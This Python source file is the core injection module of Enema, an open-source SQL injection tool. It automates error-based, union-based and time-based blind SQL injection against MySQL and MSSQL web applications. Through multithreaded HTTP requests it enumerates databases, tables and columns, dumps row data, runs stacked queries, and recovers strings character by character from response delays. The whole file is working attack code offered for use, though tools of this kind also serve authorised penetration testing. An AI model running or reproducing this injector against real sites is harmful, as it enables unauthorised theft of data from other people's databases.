"""
    Enema module (core): Injector
    Copyright (C) 2011 Valeriy Bogachuk
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import sys
import time
import datetime
import core.txtproc
from core.http import HTTP_Handler
from PyQt4 import QtCore
import threading
from queue import Queue


class Injector(QtCore.QThread):
    
    #---------------Signals---------------#
    logSignal = QtCore.pyqtSignal(str)
    progressSignal = QtCore.pyqtSignal(int, bool)
    dbSignal = QtCore.pyqtSignal(str)
    columnSignal = QtCore.pyqtSignal(str, int)
    rowDataSignal = QtCore.pyqtSignal(int, int, str)
    querySignal = QtCore.pyqtSignal(str, bool)
    tblSignal = QtCore.pyqtSignal(str)
    #----------------------------------------#
    
    def __init__(self, vars, qstrings):
        QtCore.QThread.__init__(self)
        self.wq = HTTP_Handler()
        self.vars = vars
        self.qstrings = qstrings
        self.killed = False
        self.wq.logSignal.connect(self.logger)
        
    def run(self):
        self.logSignal.emit("\n+++ TASK STARTED +++")
        
        #Tables task
        if self.vars['task'] == "tables":
            self.getTables()
            
        #Databases task    
        if self.vars['task'] == "bases" :
            self.getBases()
            
        #Columns task 
        if self.vars['task'] == "columns":
            self.getColumns()
            
        #Query task    
        if self.vars['task'] == "query":
            self.runQuery()
            
        #Dump task
        if self.vars['task'] == "dump":
            self.syncThreads()
            
        self.progressSignal.emit(0, True)
         
        self.logSignal.emit("\n--- TASK STOPPED ---")
        
    def kill(self):
        if self.isRunning():
            self.logSignal.emit("\n\n!!! KILL SIGNAL RECIEVED !!!")
        self.killed = True
        
    #Log
    def logger(self, strValue, notFunction=True):
        if notFunction:
            self.logSignal.emit(strValue)
            return
        self.logSignal.emit("\n - [x] 'no_content' returned by function " + strValue)
    
    def verbose(self, msg , query, rdata=None):
        if self.vars['verbose']:
            if query is None:
                time.sleep(0.01)
                self.logSignal.emit("[RESPONSE DATA]: " + rdata)
            else:
                query = query.replace("[eq]", "=")
                self.logSignal.emit("-------------------|" + msg+ "|--------------------")
                self.logSignal.emit("[QUERY]: " + query)
                
    #Current db type selected
    def dbType(self, todo):
        if self.vars['db_type'] == "MySQL":
            if self.vars['inj_type'] == "ERROR-BASED":
                qstring = self.qstrings['mysql_error_based'][todo]
            else:
                qstring = self.qstrings['mysql_union_based'][todo]
        else:
            if self.vars['inj_type'] == "ERROR-BASED":
                qstring = self.qstrings['mssql_error_based'][todo]
            else:
                qstring = self.qstrings['mssql_union_based'][todo]
        return core.txtproc.correctQstr(qstring)
        
    #Get current database
    def getCurrDb(self):
        if self.vars['dbListCount'] < 1:
            query = self.wq.buildQuery(self.dbType('curr_db_name'), self.vars)
            self.verbose("Fetching current db name" , query)
            db_name = self.wq.httpRequest(query, False, self.vars)
            self.verbose(None , None, db_name)
            if db_name == "no_content": 
                self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                return 'no_db'
            self.dbSignal.emit(db_name)
        else:
            db_name = self.vars['dbName']
        return db_name
        
    #Getting bases
    def getBases(self):
        #If not in (array) method selected
        if self.vars['notInArray']:
            current_db = self.vars['dbName']
            while not self.killed:
                query = self.wq.buildQuery(self.dbType('get_db_name'), self.vars, {'cdb' : current_db})
                self.verbose("Fetching db name" , query)
                db_name = self.wq.httpRequest(query, False, self.vars)
                self.verbose(None , None, db_name)
                if db_name == "no_content":
                    self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                    return
                elif db_name == "isnull":
                    break
                current_db += ",'" + db_name + "'"
                self.dbSignal.emit(db_name)
        #not in (substring) method
        else:
            query = self.wq.buildQuery(self.dbType('dbs_count'), self.vars)
            self.verbose("Fetching count of databases" , query)
            dbCount = self.wq.httpRequest(query, False, self.vars)
            self.verbose(None , None, dbCount)
            if dbCount == "no_content":
                self.logger(sys._getframe().f_code.co_name + "() -> dbCount", False)
                return
            try:
                dbCount = int(dbCount)
            except ValueError as err:
                self.logger("\n[x] Something wrong. Check server request and response...\n\n[details]: " + str(err), True)
                return
            if dbCount < 1:
                return
            tQueue = Queue()
            threads = []
            for tNum in range(dbCount):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = threading.Thread(target=self.mtBases, args=(tNum, tQueue, dbCount)) 
                threads.append(t)
                t.start()
                time.sleep(0.1)
            for thread in threads:
                thread.join()
                    
    #Multithread tables
    def mtBases(self, tNum, tQueue, dbCount):
        while not self.killed:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.wq.buildQuery(self.dbType('get_db_name2'), self.vars, {'num' : str(tNum)})
            self.verbose("Fetching db name multithreaded" , query)
            db_name = self.wq.httpRequest(query, False, self.vars)
            if db_name == "no_content":
                self.logger(sys._getframe().f_code.co_name + "() -> db_name", False)
                return
            self.dbSignal.emit(db_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(dbCount) - 1, False)

    #Getting tables
    def getTables(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        query = self.wq.buildQuery(self.dbType('tbls_count'), self.vars,\
                                   {'cdb' : current_db})
        self.verbose("Fetching count of tables" , query)
        tblCount = self.wq.httpRequest(query, False, self.vars)
        self.verbose(None , None, tblCount)
        if tblCount == "no_content": 
            self.logger(sys._getframe().f_code.co_name + "() -> tblCount", False)
            return
        try:
            tblCount = int(tblCount)
        except ValueError as err:
            self.logger("\n[x] Something wrong. Check server request and response...\n\n[details]: " + str(err), True)
            return
        if tblCount < 1:
            return
        if self.vars['notInArray']:
            current_table = ""
            while not self.killed:
                query = self.wq.buildQuery(self.dbType('get_tbl_name'), self.vars,\
                                        {'cdb' : current_db, 'ctbl' : current_table})
                self.verbose("Fetching table_name" , query)
                table_name = self.wq.httpRequest(query, False, self.vars)
                self.verbose(None , None, table_name)
                if table_name == "no_content":
                    self.logger(sys._getframe().f_code.co_name + "() -> table_name", False)
                    return
                elif table_name == "isnull":
                    break
                current_table += ",'" + table_name + "'"
                self.tblSignal.emit(table_name)
                self.progressSignal.emit(tblCount, False)
        else:
            tQueue = Queue()
            threads = []
            for tNum in range(tblCount):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = threading.Thread(target=self.mtTables, args=(tNum, tQueue, tblCount, current_db)) 
                threads.append(t)
                t.start()
                time.sleep(0.1)
            for thread in threads:
                thread.join()
                
    #Multithread tables
    def mtTables(self, tNum, tQueue, tblCount, current_db):
        while not self.killed:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.wq.buildQuery(self.dbType('get_tbl_name2'), self.vars,\
                                        {'cdb' : current_db, 'num' : str(tNum)})
            self.verbose("Fetching table name" , query)
            table_name = self.wq.httpRequest(query, False, self.vars)
            if table_name == "no_content":
                self.logger(sys._getframe().f_code.co_name + "() -> table_name", False)
                return
            self.tblSignal.emit(table_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(tblCount) - 1, False)
        
    #Getitng columns
    def getColumns(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        tables = self.vars['tables']
        #If not in(array) method selected:
        if self.vars['notInArray']: 
            for i in range (self.vars['tblTreeCount']):
                current_table = core.txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                current_column = ""
                query = self.wq.buildQuery(self.dbType('columns_count'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table})
                self.verbose("Fetching count of columns in table: " +  tables[i], query)
                columnsInTable = self.wq.httpRequest(query, False, self.vars)
                self.verbose(None , None, columnsInTable)
                if columnsInTable == "no_content": 
                    self.logger(sys._getframe().f_code.co_name + "() -> notInArray -> columnsinTable", False)
                    return
                try:
                    columnsInTable = int(columnsInTable)
                except ValueError as err:
                    self.logger("\n[x] Something wrong. Check server request and response...\n\n[details]: " + str(err), True)
                    return
                while not self.killed:
                    query = self.wq.buildQuery(self.dbType('get_column_name'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table, 'ccol': current_column})
                    self.verbose("Fetching column name" , query)
                    column_name = self.wq.httpRequest(query, False, self.vars)
                    self.verbose(None , None, column_name)
                    if column_name == "no_content":
                        self.logger(sys._getframe().f_code.co_name + "() -> notInArray -> column_name", False)
                        return
                    elif column_name == "isnull":
                        break
                    current_column += ",'" + column_name + "'"
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(columnsInTable, False)
        else:
            for i in range (self.vars['tblTreeCount']):
                current_table = core.txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                query = self.wq.buildQuery(self.dbType('columns_count'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table})
                self.verbose("Fetching count of columns in table: " +  tables[i], query)
                columnsInTable = self.wq.httpRequest(query, False, self.vars)
                self.verbose(None , None, columnsInTable)
                if columnsInTable == "no_content": 
                    self.logger(sys._getframe().f_code.co_name + "() -> columnsinTable", False)
                    return
                try:
                    columnsInTable = int(columnsInTable)
                except ValueError as err:
                    self.logger("\n[x] Something wrong. Check server request and response...\n\n[details]: " + str(err), True)
                    return
                for rowid in range(columnsInTable):
                    if self.killed:
                        return
                    #If not in(substring) method selected:
                    if (self.vars['notInSubstring'] or self.vars['LIMIT']):
                        query = self.wq.buildQuery(self.dbType('get_column_name2'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table, 'num' : str(rowid)})
                    #If ordinal_position method selected:
                    elif self.vars['ordinal_position']:
                        rowid += 1
                        query = self.wq.buildQuery(self.dbType('get_column_name3'), self.vars,\
                                           {'cdb' : current_db, 'ctbl' : current_table, 'num' : str(rowid)})
                    self.verbose("Fetching count of columns in table: " +  tables[i], query)
                    column_name = self.wq.httpRequest(query, False, self.vars)
                    self.verbose(None , None, column_name)
                    if column_name == "no_content":
                        self.logger(sys._getframe().f_code.co_name + "() -> notInSubstring -> column_name", False)
                        return
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False)
        
    #Run Query     
    def runQuery(self):
        #If this select command
        if not self.vars['isStacked']:
            query = self.wq.buildQuery(self.dbType('query'), self.vars)
            if self.vars['method'] == "POST":
                query = query.replace("=", "[eq]")
            self.verbose("Fetching query result" , query)
            result = self.wq.httpRequest(query, False, self.vars)
            self.verbose(None , None, result)
        else:
            result = "NULL"
            if self.vars['hexed']:
                query = self.wq.buildQuery(self.dbType('exec_hex'), self.vars, {'hex' : core.txtproc.strToHex(self.vars['query_cmd'], True)})
            else:
                query = self.vars['query_cmd']
            self.verbose("Executing stacked query" , query)
            self.wq.httpRequest(query, True, self.vars)
        self.querySignal.emit(result, False)

    #Making synchronized threads for dumper
    def syncThreads(self):
        current_db = self.getCurrDb()
        if current_db == 'no_db':
            return
        columns = self.vars['columns']
        threads = []
        for num in range (len(columns)):
            tQueue = Queue()
            for tNum in range(self.vars['fromPos'] + 1, self.vars['toPos'] + 1):
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = threading.Thread(target=self.doDump, args=(tNum, tQueue, current_db, str(columns[num]), num))
                threads.append(t)
                t.start()
                time.sleep(0.1)
        for thread in threads:
            thread.join()
                
    #Data dumping           
    def doDump(self, tNum, tQueue, current_db, column, num):
        while not self.killed:
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.wq.buildQuery(self.dbType('data_dump'), self.vars, {'cdb' : current_db, 'column' : column, 'num' : str(tNum)})
            self.verbose("Fetching row data multithreaded" , query)
            rowData = self.wq.httpRequest(query, False, self.vars)
            if rowData == "no_content":
                rowData = "NULL"
            self.rowDataSignal.emit(tNum, num, rowData)
            self.progressSignal.emit(-1, False)
            time.sleep(0.1)
            tQueue.task_done()


class BlindInjector(QtCore.QThread):
    
    #---------------Signals---------------#
    logSignal = QtCore.pyqtSignal(str)
    progressSignal = QtCore.pyqtSignal(int, bool)
    querySignal = QtCore.pyqtSignal(str, bool)
    trueTimeSignal = QtCore.pyqtSignal(float)
    #----------------------------------------#
    
    def __init__(self, vars, qstrings):
        QtCore.QThread.__init__(self)
        self.wq = HTTP_Handler()
        self.vars = vars
        self.qstrings = qstrings
        self.killed = False
        self.wq.logSignal.connect(self.logger)
        
    def run(self):
        self.logSignal.emit("\n+++ BLIND TASK STARTED +++")
        if self.vars['task'] == "delay_test":
            self.delayTest()
        else:
            self.blindTask()
            
        self.progressSignal.emit(0, True)
         
        self.logSignal.emit("\n--- BLIND TASK STOPPED ---")
        
    def kill(self):
        if self.isRunning():
            self.logSignal.emit("\n\n!!! KILL SIGNAL RECIEVED !!!")
        self.killed = True

    #Log
    def logger(self, strValue):
        self.logSignal.emit(strValue)
        
    #Current db type selected
    def blindType(self, todo):
        if self.vars['db_type'] == "MySQL":
            if self.vars['blind_inj_type'] == "TIME-BASED":
                qstring = self.qstrings['mysql_blind_time_based'][todo]
        else:
            if self.vars['blind_inj_type'] == "TIME-BASED":
                qstring = self.qstrings['mssql_blind_time_based'][todo]
        return core.txtproc.correctQstr(qstring)
    
    def verbose(self, query, respInfo=None):
        if self.vars['verbose']:
            if query is None:
                self.logSignal.emit("[RESPONSE DATA]: " + str(respInfo['rdata']) + "\n[RESPONSE TIME]: " + str(respInfo['rtime']) )
            else:
                query = query.replace("[eq]", "=")
                self.logSignal.emit("---------------------------------------")
                self.logSignal.emit("[QUERY]: " + query)
   
    #Testing for optimal delay
    def delayTest(self):
        testLog = "Base / Delayed (0:0:" + str(self.vars['time']) + ")\n\n"
        response = self.wq.httpRequest("", False, self.vars, True)
        query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
        if self.vars['hexed']:
            hex = core.txtproc.strToHex(query, True)
            query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
        if self.vars['method'] == "POST":
            query = query.replace("=", "[eq]")
        for resp in range(3):
            response = self.wq.httpRequest("", False, self.vars, True)
            self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
            testLog += str(response) + " (" + str(core.txtproc.roundTime(response)) + " sec) / "
            response = self.wq.httpRequest(query, False, self.vars, True)
            self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
            testLog += str(response) + " (" + str(core.txtproc.roundTime(response)) + " sec)\n"
            self.querySignal.emit(testLog, False)
        testLog += "\nDone."
        self.querySignal.emit(testLog, False)
        
    def blindTask(self):
        self.symbol_num = 1
        self.request_counter = 0
        self.string_fetched = False
        self.symbol = ""
        self.bad_response = False
        self.bad_time = 0
        retry_counter = 0
        
        #First six codes of symbol ranges
        self.lowerAlphabet = [97, 98, 99, 100, 101, 102]
        self.upperAlphabet = [65, 66, 67, 68, 69, 70]
        self.numbers = [48, 49, 50, 51, 52, 53]
        self.spec_1 = [32, 33, 34, 35, 36, 37]
        self.spec_2 = [58, 59, 60, 61, 62, 63]
        self.spec_3 = [91, 92, 93, 94, 95, 96]
            
        start_time = time.time()
        
        #just resolving
        response = self.wq.httpRequest("", False, self.vars, True)
        
        #Using user-defined 'True' response time
        if not self.vars['auto_detect']:
            self.logSignal.emit("\n====================================\n\n"\
            "[!] Autodetect skipped, using user-defined 'True' response time: " + str(core.txtproc.roundTime(self.vars['true_time'])) +\
            "sec (rounding from " + str(self.vars['true_time']) + " +- "\
            + str(self.vars['difference']) + "; Max allowable lag time: " + str(self.vars['max_lag']) +\
            ")\n\n====================================\n") 
            self.response = self.vars['true_time']
        #Auto detecting time
        else:
            query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
            if self.vars['hexed']:
                hex = core.txtproc.strToHex(query, True)
                query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
            if self.vars['method'] == "POST":
                query = query.replace("=", "[eq]")
            for i in range(2):
                self.verbose(query)
                response = self.wq.httpRequest(query, False, self.vars, True)
                self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
            self.logSignal.emit("\n====================================\n\n"\
            "[+] Setting 'True' response time to " + str(core.txtproc.roundTime(response)) +\
            "sec (rounding from " + str(response) + " +- " + str(self.vars['difference']) + "; Max allowable lag time: " + str(self.vars['max_lag']) +\
            ")\n\n====================================\n") 
            self.response = response
            self.trueTimeSignal.emit(self.response)
            
        #Rows count check. If more than 1 row - aborting.
        if "count(*)" not in self.vars['query_cmd'].lower():
            if "from" in self.vars['query_cmd'].lower():
                self.mode = "count"
                if self.preCheck():
                    if self.delayed("between 50 and 57"):
                        self.querySignal.emit("Query returned more than 1 row.", True)
                        return
                
        self.mode = "single"
        
        while not (self.string_fetched or self.killed):
            if self.preCheck():
                symbol_found = self.getSymbol()
                if not symbol_found:
                    if not self.bad_response:
                        retry_counter = 0
                        break
                    else:
                        if retry_counter > 2:
                            self.logSignal.emit("[!] Retried " + str(retry_counter) + \
                            " times, but server response time (" + str(self.bad_time) + ") more than detected at begining fetching (" + str(self.response) + ")"\
                            " Try to increase delay. Stopping.")
                            break
                        retry_counter += 1
                        self.logSignal.emit("!!! LAG DETECTED (response time: " + str(self.bad_time) + ") !!!: Retry #"+ str(retry_counter))
                        time.sleep(3)
                if self.symbol == "NULL":
                    self.querySignal.emit(self.symbol, True)
                    break
                self.querySignal.emit(self.symbol, True)
                
        seconds = str(time.time() - start_time).split('.')
        elapsed = str(datetime.timedelta(seconds=int(seconds[0])))
        self.logSignal.emit("Total requests sent: " + str(self.request_counter) + "\nElapsed time: " + elapsed)
    
    def getSymbol(self):
        #Lower alphabet
        if self.delayed("between 97 and 122"): 
            self.algorythm("lower_letters", self.lowerAlphabet)
            return True
        #Upper alphabet
        if self.delayed("between 65 and 90"): 
            self.algorythm("upper_letters", self.upperAlphabet)
            return True
        #Numbers
        if self.delayed("between 48 and 57"): 
            self.algorythm("numbers", self.numbers)
            return True
        #Special symbols #1
        if self.delayed("between 32 and 47"): 
            self.algorythm("spec_1", self.spec_1)
            return True
        #Special symbols #2
        if self.delayed("between 58 and 64"): 
            self.algorythm("spec_2", self.spec_2)
            return True
        #Special symbols #3
        if self.delayed("between 91 and 96"): 
            self.algorythm("spec_3", self.spec_3)
            return True
        #Special symbols #4
        if self.delayed("between 123 and 126"): 
            self.algorythm("spec_4")
            return True
        #[new line], [tab]
        if self.delayed("between 9 and 10"): 
            self.algorythm("other")
            return True          
        return False
        
    def preCheck(self):
        #Checking for valid response
        if not self.delayed("between 9 and 127"):
            self.string_fetched = True
            self.logSignal.emit("[*] Finished.")
            return False
        #If request valid, but server returned NULL
        if self.delayed("= 127"):
            self.string_fetched = True
            self.symbol = "NULL"
            return True
        return True

    #If delay occurred
    def delayed(self, condition):
        if self.mode == "single":
            query = self.wq.buildQuery(self.blindType('single_row'), self.vars,\
                                        {'symbol_num' : str(self.symbol_num), 'condition' : " " + condition, 'delay' : str(self.vars['time'])})
        else:
            query = self.wq.buildQuery(self.blindType('rows_count'), self.vars,\
                                        {'symbol_num' : str(self.symbol_num), 'condition' : " " + condition, 'delay' : str(self.vars['time'])})
        if self.vars['hexed'] :
            query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars,{'hex' : core.txtproc.strToHex(query, True)})
        if self.vars['method'] == "POST":
            query = query.replace("=", "[eq]")
        self.verbose(query)
        self.request_counter += 1
        response = self.wq.httpRequest(query, False, self.vars, True)
        #If response time < allowable difference (-)
        if (core.txtproc.roundTime(response) < core.txtproc.roundTime(self.response - self.vars['difference'])):
            self.verbose(None, {'rdata' : False,  'rtime' : str(response)})
            return False
        #If response time > max lagging time
        if (core.txtproc.roundTime(response) > (self.response + self.vars['max_lag'])):
            self.verbose(None, {'rdata' : "UNKNOWN (response time was longer). Try to increase maximum lag time.",  'rtime' : str(response)})
            self.bad_response = True
            self.bad_time = response
            return False
        #If response match with allowable difference (+ -)
        if (core.txtproc.roundTime(response) == core.txtproc.roundTime(self.response + self.vars['difference']) or\
        core.txtproc.roundTime(response) == core.txtproc.roundTime(self.response - self.vars['difference'])):
            self.bad_response = False
            self.verbose(None, {'rdata' : True,  'rtime' : str(response)})
            return True
        
    #Return symbol
    def retSymbol(self, code):
        self.symbol += chr(code)
        self.symbol_num += 1
    
    #Generate next group of 6 codes 
    def nextCodes(self, codeList):
        newCodes = []
        for code in codeList:
            newCodes.append(code + 6)
        return(newCodes)
    
    #Blind algorythm    
    def algorythm(self, mode, codeList=None):
        if (mode == "lower_letters" or mode == "upper_letters"):
            count = 4
        elif mode == "numbers":
            count = 1
        elif mode == "spec_1":
            count = 2
        elif mode == "spec_2":
            count = 1
        elif mode == "spec_3":
            count = 1
        else:
            count = 0
        for code_group in range(1, count + 1):
            if self.killed:
                return
            if self.delayed("in(" + ','.join(str(code) for code in codeList) + ")"):
                if self.delayed("> " + str(codeList[1])):
                    if self.delayed("> " + str(codeList[3])):
                        if self.delayed("> " + str(codeList[4])):
                            self.retSymbol(codeList[5])
                        else:
                            self.retSymbol(codeList[4])
                    else:
                        if self.delayed("> " + str(codeList[2])):
                            self.retSymbol(codeList[3])
                        else:
                            self.retSymbol(codeList[2])
                else:
                    if self.delayed("> " + str(codeList[0])):
                        self.retSymbol(codeList[1])
                    else:
                        self.retSymbol(codeList[0])
                return True
            codeList = self.nextCodes(codeList)
            
        if mode == "lower_letters":
            #y, z
            if self.delayed("> 121"):
                self.retSymbol(122)
            else:
                self.retSymbol(121)
            return True
                
        elif mode == "upper_letters":
            #Y, Z
            if self.delayed("> 89"):
                self.retSymbol(90)
            else:
                self.retSymbol(89)
            return True

        elif mode == "numbers":
            #6, 7, 8, 9
            if self.delayed("> 56"):
                self.retSymbol(57)
            else:
                if self.delayed("> 55"):
                    self.retSymbol(56)
                else:
                    if self.delayed("> 54"):
                        self.retSymbol(55)
                    else:
                        self.retSymbol(54)
            return True
            
        elif mode == "spec_1":
            #,- . /
            if self.delayed("> 46"):
                self.retSymbol(47)
            else:
                if self.delayed("> 45"):
                    self.retSymbol(46)
                else:
                    if self.delayed("> 44"):
                        self.retSymbol(45)
                    else:
                        self.retSymbol(44)
            return True

        elif mode == "spec_2":
            #@
            self.retSymbol(64)
            return True

        elif mode == "spec_4":
            #{ | } ~
            if self.delayed("> 125"):
                self.retSymbol(126)
            else:
                if self.delayed("> 124"):
                    self.retSymbol(125)
                else:
                    if self.delayed("> 123"):
                        self.retSymbol(124)
                    else:
                        self.retSymbol(123)
            return True
            
        else:
            if self.delayed("> 9"):
                self.retSymbol(10)
            else:
                self.retSymbol(9)
            return True
            
        return False
